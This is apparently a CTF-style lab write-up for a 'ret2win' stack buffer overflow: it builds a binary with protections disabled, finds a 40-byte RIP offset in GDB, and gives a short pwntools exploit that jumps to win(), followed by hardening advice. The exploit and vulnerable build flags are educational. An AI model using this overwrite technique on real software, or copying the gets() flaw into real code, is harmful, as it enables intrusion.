# Basic buffer overflow — `ret2win`

**Goal:** overwrite RIP and redirect execution to a `win()` function.
This is an educational / CTF-style challenge compiled without common hardening features so you can study classic stack exploitation.

> **Disclaimer:** This repo is for learning and authorized testing only. Do not use these techniques against systems you do not own or have explicit permission to test.

---

## Table of contents

* [Build](#build)
* [Binary analysis (GDB)](#binary-analysis-gdb)
* [Finding the overflow and offset](#finding-the-overflow-and-offset)
* [Exploit (pwntools)](#exploit-pwntools)
* [Explanation of the payload](#explanation-of-the-payload)
* [Mitigations / hardening](#mitigations--hardening)
* [Assets / screenshots](#assets--screenshots)

---

## Build

Compile the vulnerable binary without stack protections and with an executable stack:

```bash
gcc -o vuln vuln.c -g -fno-stack-protector -z execstack -no-pie
```

---

## Binary analysis (GDB)

Start the binary under GDB:

```bash
gdb ./vuln
```

Use `info functions` to list functions and `disassemble` on relevant functions to inspect the code paths. In this challenge the `vuln()` function calls `gets()` which does not check input length — a classic stack overflow vector.

Useful GDB commands I used:

* `info functions`
* `disassemble vuln`
* `break <address|function>`
* `run`
* `x/40bx $rsp` 
* `p win` / `info address win` to find the `win()` address

(See `assets/*.png` for screenshots of functions, disassembly, breakpoints, memory map.)

---

## Finding the overflow and offset

1. Generate a cyclic pattern to determine the offset where RIP gets overwritten:

```bash
cyclic 200
# paste the pattern as input to the program
```

2. After the crash, note the overwritten RIP value from the register dump and compute the offset:

```bash
# Example: if RIP contains 0x6161616c6161616b
cyclic -l 0x6161616c6161616b
# This returns the offset (40 in this challenge)
```

In this challenge the offset to RIP is **40 bytes** (32 bytes for the buffer + 8 bytes for saved RBP).

---

## Exploit (pwntools)

Minimal pwntools exploit I used:

```py
#!/usr/bin/python3
from pwn import *

p = process("./vuln")

offset = 40
secret = p64(0x401156)  # little-endian 64-bit address of win()

payload = b"A" * offset + secret

print("[+] Sending payload...")
p.sendline(payload)

print(p.recvall().decode())
# EOF
```

Run it with:

```bash
python3 exploit.py
```

Expected result: the program returns whatever `win()` prints / performs.

---

## Explanation of the payload

* `offset = 40`: number of bytes needed to reach saved RIP.
* `b"A" * offset`: overwrite buffer + saved RBP up to saved RIP.
* `p64(0x401156)`: 64-bit little-endian address of `win()` — when placed at saved RIP, execution jumps to `win()` on `ret`.

This is a simple `ret2win` (return-to-function) technique: overwrite the return address with the address of a target function already present in the binary.

---

## Mitigations / Hardening

To prevent this class of bug in real-world programs, enable and use the following compiler/runtime protections:

* **Stack canaries**: `-fstack-protector` (detects stack smashing)
* **Non-executable stack**: avoid `-z execstack` (makes injected shellcode harder)
* **Address Space Layout Randomization (ASLR)**: system-level randomization of addresses
* **Position-independent executables (PIE)**: `-fPIE -pie` (randomize code segment loads)
* **Bounds-checked input**: avoid unsafe functions like `gets()` — use `fgets()` or `read()` with proper bounds.
* Use modern tooling: static analyzers, compiler warnings, sanitizers (`-fsanitize=address`), and code review.

---

## Assets / screenshots

Repository includes `assets/` with the following screenshots used in the writeup:

* `functions.png` — function listing from GDB
* `disassemble.png` — disassembly snippets
* `breakpoint.png` — breakpoint set at `gets`
* `insert_data.png` — injecting cyclic data
* `RIP.png` — register dump showing overwritten RIP
* `memory_map.png` — memory layout / maps

---